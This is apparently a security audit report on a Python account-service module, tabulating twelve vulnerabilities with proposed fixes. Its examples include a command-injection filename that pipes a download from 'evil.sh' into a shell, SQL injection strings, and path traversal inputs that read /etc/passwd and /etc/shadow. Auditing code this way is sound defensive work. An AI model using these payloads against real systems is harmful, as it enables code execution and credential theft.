The module is standalone in this directory — no callers to inspect — so reachability of user-controlled input is inferred from the docstring ("Internal module backing the `/account` endpoints") and the `session_user_id` parameters, which only make sense if these are request-driven.

## Findings

| # | Finding | Evidence | Impact | Priority | Proposed Fix | Risk |
|---|---------|----------|--------|----------|--------------|------|
| 1 | **Command injection** — `filename` is interpolated into a `shell=True` string | `account_service.py:120-125` | A filename like `x.csv; curl evil.sh \| sh` executes arbitrary commands as the service user. Full RCE. | **Critical** `CONFIRMED` | Drop `shell=True`, pass an argument list: `subprocess.run(["python3","tools/export.py","--user",str(user_id),...])`; validate `filename` against `^[A-Za-z0-9_.-]+$` | Low — behavior-preserving |
| 2 | **SQL injection** — f-string interpolation of `username` into the query | `account_service.py:34` | `' OR '1'='1' --` returns the first account including its `password_hash`; `UNION SELECT` dumps arbitrary tables. Auth bypass at `:59` if the injected row's hash is attacker-chosen. | **Critical** `CONFIRMED` | Parameterize: `conn.execute("... WHERE username = ?", (username,))` — the sibling at `:46` already does this | Low |
| 3 | **Hardcoded secret in source** | `account_service.py:19` | `sk_live_` prefix indicates a live production key, committed in plaintext. Also used as the password pepper (`:75`) — leaking it makes every stored hash offline-crackable. | **Critical** `CONFIRMED` | Load from env/secret manager; **rotate the key** — it must be treated as compromised | Medium — rotation invalidates existing hashes, needs a rehash-on-login path |
| 4 | **Missing authorization — IDOR on write** — `session_user_id` accepted but never compared to `target_user_id` | `account_service.py:83-100` (param at `:83` unused) | Any authenticated user can rewrite any other account's `email`, enabling account takeover via password reset. | **Critical** `CONFIRMED` | Mirror the check at `:160`: reject unless `actor["role"] == "admin" or session_user_id == target_user_id` | Low |
| 5 | **Missing authorization — IDOR on read** — same unused `session_user_id` | `account_service.py:103-114` (param at `:103` unused) | Any authenticated user can enumerate every account's email, timezone, and `role` by iterating `target_user_id`. Role disclosure aids admin targeting. | **High** `CONFIRMED` | Same ownership/admin check before the query | Low |
| 6 | **Plaintext password written to logs** | `account_service.py:61-63` | Every successful login writes the cleartext password to the application log. Log aggregation, backups, and anyone with log-read access get a credential dump. | **High** `CONFIRMED` | Remove the `password` argument from the log call; log only `username` and timestamp | None |
| 7 | **Unsuitable password hashing** — single-round SHA-256 with a global pepper, no per-user salt | `account_service.py:72-75` | SHA-256 is designed to be fast: commodity GPUs do billions/sec. One global pepper means identical passwords yield identical hashes, so a single rainbow table covers the whole user base once `SIGNING_KEY` leaks (see #3). | **High** `CONFIRMED` | Use `bcrypt`/`argon2id` (or `hashlib.scrypt`) with a per-user random salt; rehash on next successful login | Medium — needs migration |
| 8 | **Path traversal** — `filename` reaches `os.path.join` unvalidated | `account_service.py:119`, read back at `:126` | `../../etc/passwd` escapes `EXPORT_DIR`; an absolute path (`/etc/shadow`) makes `os.path.join` discard `EXPORT_DIR` entirely. The bytes are returned to the caller → arbitrary file read. | **High** `CONFIRMED` | Reject separators and absolute paths, then assert `os.path.realpath(destination).startswith(os.path.realpath(EXPORT_DIR) + os.sep)` | Low |
| 9 | **Non-constant-time hash comparison** | `account_service.py:59` | `==` on `str` short-circuits at the first differing byte. Remotely exploitable timing side channels on hash comparison are difficult but the mitigation is free. | **Medium** `CONFIRMED` | `hmac.compare_digest(account["password_hash"], _hash_password(password))` | None |
| 10 | **`password_hash` returned to callers** | `account_service.py:34, 36` | `find_by_username` is a general-purpose lookup returning the hash in its dict; any caller that serializes the result leaks it. Only `verify_credentials` needs it. | **Medium** `HYPOTHESIS` — no callers visible in this directory to confirm leakage | Drop `password_hash` from the default select; add a separate internal `_credentials_for(username)` | Low |
| 11 | **Export result not bound to the requesting session** | `account_service.py:117` | `export_account_data` takes `user_id` with no session parameter and no ownership check, so a caller can export any account's full data. Unlike `:83`/`:103` there isn't even a session parameter to check against. | **Medium** `CONFIRMED` (missing control is in-file; exploitability depends on the route) | Add `session_user_id` and apply the same ownership/admin check | Low |
| 12 | **`days` unvalidated** | `account_service.py:130, 134` | Negative `days` moves `cutoff` into the future (empty result); a very large value returns all accounts up to `limit`. `limit` is capped at `:132`, `days` is not. Low severity — the query is parameterized. | **Low** `CONFIRMED` | Clamp to a sane range, e.g. `days = max(1, min(days, 365))` | None |

## Notes

- `deactivate_account` (`:155-169`) is the correct pattern — it resolves the actor, then enforces admin-or-self. Items #4, #5, and #11 are the same function signature without that check.
- `update_profile`'s dynamic SQL at `:90` is **not** injectable: keys are filtered against the `allowed` allowlist at `:85-86` before interpolation, and values are bound. Leaving as-is.
- `normalize_email` (`:147`) uses `re.fullmatch` with an anchored, `@`/whitespace-excluding pattern — adequate for validation, no ReDoS (no nested quantifiers).
- Not assessed: whether `tools/export.py` (`:121`) performs its own authorization or input handling — the file isn't in this directory.

Highest-leverage fixes are #1, #2, and #4 — each is a single-function change and each independently yields full compromise.
